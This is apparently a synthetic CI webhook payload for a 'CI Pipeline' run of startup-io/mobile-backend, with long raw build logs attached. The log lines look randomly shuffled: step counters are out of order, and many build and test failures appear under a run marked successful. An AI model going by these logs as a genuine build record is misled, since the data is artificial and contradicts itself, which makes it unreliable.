{
  "action": "completed",
  "workflow_run": {
    "id": 575,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "bbec832e0ae4fbb6c9622d3771557c5428cf453b",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-28T12:00:29.195229Z",
    "updated_at": "2025-11-28T12:05:04.865533Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "henry"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: save_cache ===\n  PASS: test_cache_hit (268ms)\nCompiling src/app.ts...\nCompiling src/service.java...\nStep 8/10: Building\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (36MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (5MB)\nCache hit for key-9918\nStep 9/10: Building\nCompiling src/handler.rs...\n[12:00:29] INFO: Processing request\n\u2713 lint completed\nCache hit for key-8443\nStep 6/10: Building\nInstalling jest@2.3.0\nArtifact uploaded: build.tar.gz (33MB)\nCache hit for key-9345\nCache hit for key-5370\n\u2713 lint completed\nCompiling src/main.py...\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 test completed\nCompiling src/app.ts...\n  PASS: test_api_health (31ms)\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:29] INFO: Processing request\nStep 5/10: Building\n\u2713 build completed\nStep 7/10: Building\nCompiling src/app.ts...\nCache hit for key-8970\nCompiling src/service.java...\n\u2713 test completed\nCache hit for key-7923\n\u2713 lint completed\n  PASS: test_api_health (324ms)\n[12:00:29] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (20MB)\n  PASS: test_auth_login (204ms)\n[12:00:29] WARN: Deprecated API usage\nInstalling prettier@4.20.0\n  PASS: test_auth_login (332ms)\nArtifact uploaded: build.tar.gz (44MB)\n  PASS: test_db_connect (494ms)\n  PASS: test_api_health (394ms)\n[12:00:29] INFO: Processing request\nStep 3/10: Building\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_auth_login (480ms)\n  PASS: test_auth_login (330ms)\n  PASS: test_auth_login (179ms)\n[12:00:29] INFO: Processing request\nWARNING: jest has known vulnerabilities\n\u2713 test completed\n  PASS: test_db_connect (331ms)\n[12:00:29] INFO: Processing request\n[12:00:29] INFO: Processing request\nStep 3/10: Building\nCache hit for key-7852\nCompiling src/utils.go...\n  PASS: test_auth_login (356ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-1902\nCache hit for key-3674\nInstalling lodash@3.18.0\n[12:00:29] WARN: Deprecated API usage\n[12:00:29] INFO: Processing request\nCache hit for key-9421\n\u2713 build completed\nInstalling prettier@3.8.0\n[12:00:29] INFO: Processing request\nStep 5/10: Building\nStep 7/10: Building\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:29] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-6981\n  PASS: test_user_create (66ms)\n  PASS: test_auth_login (227ms)\nCache hit for key-8856\n[12:00:29] WARN: Deprecated API usage\nCompiling src/app.ts...\n  PASS: test_api_health (433ms)\nStep 8/10: Building\n  PASS: test_user_create (152ms)\nStep 3/10: Building\nStep 3/10: Building\nCompiling src/utils.go...\n  PASS: test_auth_login (1ms)\n\u2713 build completed\n[12:00:29] INFO: Processing request\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\nInstalling axios@1.4.0\nCache hit for key-4676\nArtifact uploaded: build.tar.gz (7MB)\nInstalling express@5.1.0\nInstalling express@5.4.0\nArtifact uploaded: build.tar.gz (33MB)\n\u2713 test completed\nStep 4/10: Building\n  PASS: test_db_connect (302ms)\n[12:00:29] INFO: Processing request\n\u2713 build completed\n[12:00:29] ERROR: Connection failed\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (38MB)\nStep 9/10: Building\nInstalling react@5.14.0\nCompiling src/app.ts...\n[12:00:29] INFO: Processing request\n[12:00:29] INFO: Processing request\n[12:00:29] INFO: Processing request\n\u2713 test completed\n[12:00:29] INFO: Processing request\nCache hit for key-4581\nCache hit for key-3990\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_db_connect (406ms)\n  PASS: test_db_connect (254ms)\nArtifact uploaded: build.tar.gz (18MB)\nCache hit for key-9591\n=== Step save_cache completed ===\n=== Step: lint ===\nCache hit for key-8718\nStep 4/10: Building\n  PASS: test_cache_hit (142ms)\n[12:00:29] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-6331\nInstalling prettier@1.15.0\nStep 10/10: Building\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (35MB)\nCache hit for key-4039\nInstalling axios@2.16.0\nArtifact uploaded: build.tar.gz (42MB)\n[12:00:29] INFO: Processing request\nInstalling eslint@2.20.0\n[12:00:29] INFO: Processing request\nCache hit for key-1667\n[12:00:29] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling react@5.10.0\nCompiling src/main.py...\nStep 8/10: Building\n\u2713 test completed\nCache hit for key-5252\nInstalling react@2.9.0\nArtifact uploaded: build.tar.gz (2MB)\nInstalling webpack@2.14.0\nArtifact uploaded: build.tar.gz (18MB)\nInstalling webpack@4.14.0\nArtifact uploaded: build.tar.gz (16MB)\n[12:00:29] INFO: Processing request\nInstalling axios@4.4.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (45MB)\nInstalling eslint@2.2.0\nStep 9/10: Building\n[12:00:29] INFO: Processing request\nWARNING: axios has known vulnerabilities\nCompiling src/index.js...\n[12:00:29] INFO: Processing request\n[12:00:29] INFO: Processing request\n\u2713 test completed\n[12:00:29] INFO: Processing request\n  PASS: test_api_health (438ms)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (24MB)\nStep 10/10: Building\n  PASS: test_user_create (272ms)\n\u2713 test completed\nInstalling axios@5.13.0\nInstalling lodash@1.5.0\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (19MB)\nCompiling src/service.java...\nCache hit for key-9143\nArtifact uploaded: build.tar.gz (31MB)\nInstalling eslint@3.13.0\nCache hit for key-2152\nCompiling src/service.java...\nCompiling src/app.ts...\n[12:00:29] INFO: Processing request\n\u2713 test completed\nCompiling src/main.py...\nInstalling axios@2.13.0\n  PASS: test_db_connect (13ms)\nArtifact uploaded: build.tar.gz (42MB)\nInstalling react@4.19.0\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (47MB)\nStep 7/10: Building\n[12:00:29] WARN: Deprecated API usage\nStep 7/10: Building\nInstalling react@4.7.0\n[12:00:29] ERROR: Connection failed\n\u2713 lint completed\nCache hit for key-5332\nCache hit for key-7553\nArtifact uploaded: build.tar.gz (24MB)\n[12:00:29] INFO: Processing request\n  PASS: test_db_connect (14ms)\nCompiling src/main.py...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (39MB)\nStep 2/10: Building\nStep 9/10: Building\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/index.js...\nStep 9/10: Building\nInstalling eslint@2.7.0\n\u2713 build completed\n[12:00:29] WARN: Deprecated API usage\nInstalling axios@1.13.0\nInstalling react@4.11.0\nCache hit for key-9719\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (7MB)\n  PASS: test_cache_hit (71ms)\nCache hit for key-2642\nCompiling src/app.ts...\n  PASS: test_auth_login (91ms)\nInstalling jest@4.13.0\n[12:00:29] WARN: Deprecated API usage\nCache hit for key-8329\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (2MB)\nException: NullPointerException\nStep 8/10: Building\n  PASS: test_api_health (330ms)\nCompiling src/app.ts...\nStep 7/10: Building\n[12:00:29] ERROR: Connection failed\n  PASS: test_auth_login (116ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 build completed\n  PASS: test_db_connect (446ms)\n  PASS: test_db_connect (383ms)\nStep 5/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:29] ERROR: Connection failed\nInstalling prettier@4.0.0\n[12:00:29] WARN: Deprecated API usage\n=== Step lint completed ===\n=== Step: install_dependencies ===\nStep 4/10: Building\n  PASS: test_cache_hit (112ms)\nCompiling src/main.py...\n  PASS: test_api_health (55ms)\nFAILED: test_cache_hit\n\u2713 lint completed\n\u2713 lint completed\n[12:00:29] INFO: Processing request\n  PASS: test_db_connect (331ms)\nArtifact uploaded: build.tar.gz (19MB)\nInstalling axios@4.16.0\nCache hit for key-2859\nInstalling webpack@3.10.0\nStep 3/10: Building\nCache hit for key-3550\n\u2713 build completed\nArtifact uploaded: build.tar.gz (15MB)\nArtifact uploaded: build.tar.gz (22MB)\n[12:00:29] INFO: Processing request\nCache hit for key-9279\nCompiling src/app.ts...\nCompiling src/main.py...\n[12:00:29] WARN: Deprecated API usage\nCache hit for key-8589\nCache hit for key-7370\nCache hit for key-2910\nInstalling express@1.17.0\nInstalling prettier@1.7.0\nStep 6/10: Building\nInstalling react@5.8.0\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\nStep 3/10: Building\n[12:00:29] WARN: Deprecated API usage\nCache hit for key-7605\n\u2713 test completed\nArtifact uploaded: build.tar.gz (6MB)\nStep 5/10: Building\nWARNING: webpack has known vulnerabilities\n  PASS: test_auth_login (434ms)\n\u2713 lint completed\nStep 6/10: Building\nCache hit for key-7338\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_cache_hit (228ms)\n\u2713 build completed\nInstalling react@5.11.0\n  PASS: test_user_create (7ms)\nCompiling src/service.java...\n  PASS: test_cache_hit (422ms)\n  PASS: test_api_health (293ms)\nCache hit for key-8603\nStep 7/10: Building\n  PASS: test_user_create (377ms)\nInstalling jest@3.8.0\n\u2713 test completed\nInstalling react@4.19.0\nStep 6/10: Building\nInstalling axios@4.15.0\nStep 2/10: Building\nInstalling prettier@4.17.0\nStep 6/10: Building\n[12:00:29] INFO: Processing request\n  PASS: test_user_create (241ms)\n\u2717 build failed with exit code 60\n  PASS: test_api_health (271ms)\n  PASS: test_db_connect (47ms)\n[12:00:29] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (3MB)\nInstalling react@4.3.0\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:29] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/handler.rs...\nCache hit for key-4988\nCompiling src/utils.go...\nCache hit for key-4016\nCompiling src/main.py...\nInstalling jest@4.8.0\n  PASS: test_auth_login (73ms)\n\u2713 test completed\n\u2713 build completed\n[12:00:29] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/utils.go...\n[12:00:29] INFO: Processing request\nException: NullPointerException\n\u2713 lint completed\nInstalling lodash@5.20.0\nInstalling prettier@2.12.0\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:29] INFO: Processing request\n[12:00:29] INFO: Processing request\n\u2713 build completed\n  PASS: test_db_connect (416ms)\n[12:00:29] INFO: Processing request\nCache hit for key-1429\n  PASS: test_user_create (82ms)\nCompiling src/service.java...\nCache hit for key-5710\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:29] INFO: Processing request\n  PASS: test_cache_hit (495ms)\nInstalling prettier@3.13.0\n\u2713 test completed\n  PASS: test_db_connect (463ms)\nInstalling axios@5.20.0\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_user_create (10ms)\nArtifact uploaded: build.tar.gz (42MB)\nStep 7/10: Building\nWARNING: eslint has known vulnerabilities\nCompiling src/utils.go...\nInstalling eslint@5.3.0\n\u2713 lint completed\nCache hit for key-9626\nStep 8/10: Building\nCompiling src/service.java...\n  PASS: test_user_create (184ms)\nCache hit for key-2781\n  PASS: test_cache_hit (432ms)\nArtifact uploaded: build.tar.gz (32MB)\nCache hit for key-8500\nInstalling axios@5.15.0\nStep 10/10: Building\n  PASS: test_db_connect (231ms)\n=== Step install_dependencies completed ===\n=== Step: deploy_staging ===\nStep 1/10: Building\n\u2713 test completed\n  PASS: test_cache_hit (150ms)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (38MB)\nCache hit for key-3203\n[12:00:29] INFO: Processing request\nStep 1/10: Building\n[12:00:29] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (24MB)\n  PASS: test_db_connect (142ms)\n[12:00:29] INFO: Processing request\nInstalling axios@1.1.0\nStep 10/10: Building\n[12:00:29] INFO: Processing request\nInstalling webpack@1.17.0\n\u2713 lint completed\nWARNING: webpack has known vulnerabilities\nCompiling src/index.js...\n  PASS: test_cache_hit (467ms)\nCompiling src/app.ts...\n[12:00:29] INFO: Processing request\n\u2713 build completed\n  PASS: test_db_connect (455ms)\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-9630\nCompiling src/utils.go...\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (42MB)\n\u2717 build failed with exit code 17\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (6MB)\nCache hit for key-9847\n[12:00:29] INFO: Processing request\n\u2713 test completed\nCache hit for key-2590\n\u2713 build completed\nCompiling src/main.py...\nCache hit for key-5065\nArtifact uploaded: build.tar.gz (45MB)\nStep 5/10: Building\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (1MB)\nWARNING: prettier has known vulnerabilities\nStep 2/10: Building\nCache hit for key-3423\nInstalling webpack@2.6.0\nCache hit for key-8998\nInstalling eslint@3.12.0\nInstalling eslint@1.1.0\nCache hit for key-6175\nArtifact uploaded: build.tar.gz (30MB)\nArtifact uploaded: build.tar.gz (23MB)\n\u2713 build completed\nCompiling src/app.ts...\nCache hit for key-8225\n[12:00:29] INFO: Processing request\n[12:00:29] WARN: Deprecated API usage\nCache hit for key-1906\n[12:00:29] INFO: Processing request\n[12:00:29] INFO: Processing request\n[12:00:29] INFO: Processing request\nCache hit for key-4356\nArtifact uploaded: build.tar.gz (42MB)\nInstalling react@1.18.0\nArtifact uploaded: build.tar.gz (23MB)\n[12:00:29] ERROR: Connection failed\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-7182\nStep 1/10: Building\nCompiling src/handler.rs...\n\u2713 test completed\nStep 10/10: Building\n[12:00:29] INFO: Processing request\nCache hit for key-4049\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (30MB)\n  PASS: test_db_connect (242ms)\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/app.ts...\nCompiling src/main.py...\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:29] INFO: Processing request\n\u2713 lint completed\n  PASS: test_auth_login (125ms)\n[12:00:29] INFO: Processing request\nInstalling react@3.19.0\nStep 6/10: Building\n[12:00:29] INFO: Processing request\n\u2713 test completed\nCache hit for key-4776\n[12:00:29] INFO: Processing request\nCache hit for key-7364\n[12:00:29] INFO: Processing request\nStep 4/10: Building\n[12:00:29] INFO: Processing request\nCache hit for key-9450\nArtifact uploaded: build.tar.gz (19MB)\nInstalling eslint@5.2.0\nCache hit for key-7422\nStep 5/10: Building\n\u2713 build completed\nCache hit for key-5147\n[12:00:29] INFO: Processing request\n[12:00:29] INFO: Processing request\nStep 2/10: Building\nInstalling jest@2.4.0\nInstalling webpack@2.8.0\n\u2713 lint completed\nStep 3/10: Building\n\u2713 lint completed\n\u2713 build completed\nInstalling react@1.13.0\nCompiling src/utils.go...\nStep 5/10: Building\nStep 10/10: Building\nCache hit for key-5181\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:29] INFO: Processing request\nInstalling lodash@2.4.0\nCache hit for key-1125\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:29] INFO: Processing request\nStep 8/10: Building\n  PASS: test_auth_login (415ms)\n=== Step deploy_staging completed ===\n=== Step: integration_tests ===\n[12:00:29] INFO: Processing request\nInstalling webpack@1.1.0\nCache hit for key-2910\n[12:00:29] ERROR: Connection failed\nCompiling src/utils.go...\n  PASS: test_api_health (210ms)\n\u2717 build failed with exit code 22\nCompiling src/app.ts...\n[12:00:29] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling jest@3.11.0\n  PASS: test_api_health (496ms)\n[12:00:29] INFO: Processing request\n\u2713 build completed\nCache hit for key-7891\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (37MB)\n  PASS: test_user_create (260ms)\n[12:00:29] INFO: Processing request\n\u2713 build completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (41MB)\nWARNING: prettier has known vulnerabilities\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_db_connect (241ms)\n\u2713 test completed\nCache hit for key-5736\nInstalling react@1.19.0\nCache hit for key-9917\nStep 7/10: Building\nCompiling src/handler.rs...\n[12:00:29] ERROR: Connection failed\nStep 10/10: Building\nCompiling src/service.java...\n  PASS: test_auth_login (35ms)\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (33MB)\nFAILED: test_auth_login\n[12:00:29] INFO: Processing request\n  PASS: test_db_connect (64ms)\nCache hit for key-3823\nCompiling src/main.py...\nCompiling src/utils.go...\n  PASS: test_db_connect (460ms)\nCompiling src/service.java...\nStep 3/10: Building\n\u2713 test completed\nCompiling src/handler.rs...\n  PASS: test_user_create (125ms)\nArtifact uploaded: build.tar.gz (4MB)\nStep 7/10: Building\n[12:00:29] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 build completed\n  PASS: test_db_connect (431ms)\n[12:00:29] INFO: Processing request\nCache hit for key-9013\nWARNING: jest has known vulnerabilities\nCompiling src/main.py...\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (9MB)\nArtifact uploaded: build.tar.gz (12MB)\nInstalling express@5.2.0\nStep 6/10: Building\n  PASS: test_auth_login (78ms)\nCache hit for key-4160\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling lodash@3.3.0\n  PASS: test_user_create (248ms)\nInstalling axios@5.17.0\n[12:00:29] ERROR: Connection failed\nCache hit for key-3106\n  PASS: test_api_health (366ms)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-5060\nStep 8/10: Building\n  PASS: test_auth_login (478ms)\n\u2713 build completed\nCache hit for key-5605\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/handler.rs...\nCache hit for key-9305\nCompiling src/index.js...\nInstalling axios@5.7.0\nStep 9/10: Building\nInstalling eslint@2.3.0\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (32MB)\nCache hit for key-4227\nStep 6/10: Building\n\u2713 lint completed\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:29] WARN: Deprecated API usage\nStep 4/10: Building\n\u2713 lint completed\nInstalling express@1.4.0\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:29] INFO: Processing request\n\u2713 build completed\n[12:00:29] INFO: Processing request\nInstalling lodash@5.2.0\nCompiling src/service.java...\n\u2713 lint completed\nCache hit for key-3505\n\u2713 test completed\n[12:00:29] WARN: Deprecated API usage\nStep 4/10: Building\nCompiling src/service.java...\nCache hit for key-2321\nCache hit for key-8263\n  PASS: test_api_health (386ms)\n  PASS: test_auth_login (334ms)\nCompiling src/app.ts...\n\u2713 test completed\n  PASS: test_auth_login (113ms)\nCache hit for key-9997\nCache hit for key-3157\n[12:00:29] INFO: Processing request\n\u2713 lint completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (50MB)\nWARNING: lodash has known vulnerabilities\n=== Step integration_tests completed ===\n=== Step: deploy_production ===\nCache hit for key-1827\nStep 4/10: Building\nInstalling prettier@4.6.0\nCompiling src/handler.rs...\nCompiling src/utils.go...\nInstalling webpack@4.3.0\n[12:00:29] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (28MB)\nCompiling src/utils.go...\nInstalling prettier@1.1.0\n[12:00:29] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling express@5.18.0\n\u2713 build completed\nInstalling lodash@4.16.0\nInstalling eslint@4.9.0\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_auth_login (399ms)\n  PASS: test_auth_login (343ms)\nCache hit for key-7739\nArtifact uploaded: build.tar.gz (34MB)\n\u2713 test completed\n[12:00:29] INFO: Processing request\nInstalling jest@4.13.0\nArtifact uploaded: build.tar.gz (22MB)\nStep 8/10: Building\n[12:00:29] INFO: Processing request\nInstalling react@4.5.0\n\u2713 test completed\nInstalling prettier@3.11.0\nWARNING: prettier has known vulnerabilities\nStep 7/10: Building\n[12:00:29] INFO: Processing request\n[12:00:29] WARN: Deprecated API usage\nStep 8/10: Building\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/main.py...\nCompiling src/index.js...\nWARNING: prettier has known vulnerabilities\nWARNING: prettier has known vulnerabilities\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (39MB)\nInstalling react@3.4.0\n[12:00:29] INFO: Processing request\n  PASS: test_auth_login (316ms)\n\u2713 build completed\nInstalling lodash@4.6.0\n  PASS: test_cache_hit (1ms)\nCache hit for key-7480\nStep 5/10: Building\nStep 7/10: Building\nStep 3/10: Building\n[12:00:29] INFO: Processing request\nCompiling src/app.ts...\nCache hit for key-2595\n[12:00:29] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_api_health (349ms)\nArtifact uploaded: build.tar.gz (15MB)\nWARNING: prettier has known vulnerabilities\n\u2713 lint completed\n[12:00:29] INFO: Processing request\nCache hit for key-9810\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 7/10: Building\nInstalling jest@2.12.0\n\u2713 test completed\n[12:00:29] INFO: Processing request\n[12:00:29] INFO: Processing request\n\u2713 build completed\n\u2717 build failed with exit code 18\nInstalling jest@3.12.0\nInstalling react@3.5.0\n  PASS: test_db_connect (222ms)\nCache hit for key-7246\n  PASS: test_cache_hit (30ms)\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_db_connect (69ms)\nCache hit for key-5722\n  PASS: test_user_create (252ms)\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-6016\n[12:00:29] INFO: Processing request\nCache hit for key-2358\n\u2713 build completed\nCompiling src/main.py...\nCompiling src/main.py...\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (15MB)\nInstalling prettier@4.15.0\nCache hit for key-7113\nStep 6/10: Building\nCompiling src/service.java...\n[12:00:29] INFO: Processing request\nCompiling src/index.js...\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (14MB)\nInstalling express@2.12.0\n\u2717 build failed with exit code 110\n[12:00:29] INFO: Processing request\nStep 9/10: Building\nWARNING: lodash has known vulnerabilities\nStep 7/10: Building\n  PASS: test_db_connect (342ms)\nStep 7/10: Building\nStep 9/10: Building\n[12:00:29] ERROR: Connection failed\nFAILED: test_cache_hit\nCompiling src/service.java...\n[12:00:29] WARN: Deprecated API usage\n\u2713 test completed\nCache hit for key-3363\nWARNING: lodash has known vulnerabilities\nCompiling src/app.ts...\n[12:00:29] WARN: Deprecated API usage\n\u2713 test completed\n  PASS: test_cache_hit (183ms)\nArtifact uploaded: build.tar.gz (1MB)\n  PASS: test_db_connect (345ms)\nStep 10/10: Building\n[12:00:29] INFO: Processing request\nStep 2/10: Building\nCompiling src/index.js...\n\u2717 build failed with exit code 64\n=== Step deploy_production completed ===\n=== Step: build ===\nCompiling src/main.py...\n\u2713 lint completed\nCompiling src/service.java...\n[12:00:29] INFO: Processing request\nStep 3/10: Building\nCompiling src/index.js...\nCache hit for key-7744\nCache hit for key-1719\nInstalling jest@2.19.0\nArtifact uploaded: build.tar.gz (42MB)\nWARNING: express has known vulnerabilities\n  PASS: test_cache_hit (36ms)\n  PASS: test_auth_login (219ms)\n  PASS: test_db_connect (190ms)\nInstalling webpack@5.1.0\n\u2717 build failed with exit code 84\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-2038\n\u2713 build completed\nCompiling src/main.py...\n\u2717 build failed with exit code 83\n[12:00:29] WARN: Deprecated API usage\n[12:00:29] INFO: Processing request\n[12:00:29] INFO: Processing request\nCompiling src/app.ts...\nInstalling lodash@2.18.0\nCompiling src/utils.go...\nCache hit for key-4352\n\u2713 build completed\nCache hit for key-1624\nStep 5/10: Building\n[12:00:29] INFO: Processing request\nStep 9/10: Building\n[12:00:29] INFO: Processing request\nCache hit for key-2662\n  PASS: test_api_health (413ms)\nCompiling src/main.py...\n\u2713 lint completed\n\u2713 build completed\nInstalling express@3.11.0\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:29] INFO: Processing request\nCache hit for key-5919\nCompiling src/main.py...\n  PASS: test_auth_login (470ms)\nCache hit for key-3482\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: test_db_connect (173ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (28MB)\nStep 2/10: Building\n[12:00:29] INFO: Processing request\nInstalling react@3.17.0\n  PASS: test_auth_login (379ms)\n[12:00:29] INFO: Processing request\n\u2713 build completed\n[12:00:29] INFO: Processing request\nCache hit for key-1392\n  PASS: test_db_connect (186ms)\nCache hit for key-5938\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (12MB)\n  PASS: test_user_create (244ms)\nCompiling src/index.js...\n  PASS: test_db_connect (306ms)\nCompiling src/app.ts...\nInstalling axios@1.10.0\nStep 6/10: Building\nInstalling react@5.2.0\nStep 1/10: Building\n  PASS: test_auth_login (130ms)\nInstalling lodash@2.19.0\n  PASS: test_db_connect (184ms)\nCache hit for key-4400\n\u2713 lint completed\n[12:00:29] INFO: Processing request\nStep 1/10: Building\n  PASS: test_db_connect (147ms)\nArtifact uploaded: build.tar.gz (12MB)\nCompiling src/app.ts...\nCompiling src/main.py...\n\u2713 lint completed\n[12:00:29] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (37MB)\n  PASS: test_user_create (260ms)\nArtifact uploaded: build.tar.gz (11MB)\n[12:00:29] INFO: Processing request\nCompiling src/handler.rs...\n  PASS: test_auth_login (281ms)\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:29] WARN: Deprecated API usage\n\u2717 build failed with exit code 5\nFAILED: test_db_connect\nArtifact uploaded: build.tar.gz (48MB)\nInstalling react@4.5.0\nCache hit for key-3272\nCompiling src/service.java...\nInstalling express@5.13.0\nInstalling jest@5.6.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_api_health (42ms)\n  PASS: test_auth_login (359ms)\nInstalling react@4.11.0\nWARNING: jest has known vulnerabilities\nWARNING: lodash has known vulnerabilities\nCache hit for key-3163\nCompiling src/app.ts...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (29MB)\nStep 7/10: Building\nCache hit for key-8626\n  PASS: test_auth_login (14ms)\nInstalling prettier@1.18.0\n  PASS: test_api_health (70ms)\n\u2713 test completed\n[12:00:29] INFO: Processing request\nStep 6/10: Building\nCache hit for key-2128\nArtifact uploaded: build.tar.gz (20MB)\nWARNING: jest has known vulnerabilities\n  PASS: test_api_health (359ms)\nStep 4/10: Building\nCompiling src/service.java...\n=== Step build completed ===\n=== Step: upload_artifacts ===\n[12:00:29] ERROR: Connection failed\n[12:00:29] INFO: Processing request\n[12:00:29] INFO: Processing request\n\u2713 lint completed\nException: TypeError\nCache hit for key-6613\n\u2713 lint completed\n\u2713 test completed\n[12:00:29] INFO: Processing request\nStep 9/10: Building\n  PASS: test_cache_hit (112ms)\nCache hit for key-7615\nInstalling webpack@4.0.0\n  PASS: test_db_connect (369ms)\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:29] INFO: Processing request\n  PASS: test_auth_login (191ms)\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:29] INFO: Processing request\nInstalling webpack@4.14.0\nArtifact uploaded: build.tar.gz (27MB)\n\u2713 lint completed\n[12:00:29] INFO: Processing request\n  PASS: test_cache_hit (471ms)\nInstalling eslint@5.8.0\n\u2713 test completed\nCompiling src/utils.go...\nCache hit for key-8053\nCache hit for key-8581\nStep 3/10: Building\nInstalling express@3.17.0\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:29] ERROR: Connection failed\n\u2713 lint completed\n\u2713 build completed\nCache hit for key-8989\nWARNING: react has known vulnerabilities\n\u2713 lint completed\n\u2713 build completed\n[12:00:29] INFO: Processing request\n\u2713 lint completed\nCache hit for key-6697\n\u2713 build completed\n[12:00:29] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (36MB)\n[12:00:29] INFO: Processing request\nInstalling eslint@4.16.0\nCache hit for key-1101\nArtifact uploaded: build.tar.gz (45MB)\n  PASS: test_api_health (74ms)\nInstalling webpack@3.14.0\nCache hit for key-9156\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (25MB)\nArtifact uploaded: build.tar.gz (34MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_api_health (167ms)\nInstalling prettier@4.6.0\nArtifact uploaded: build.tar.gz (19MB)\n  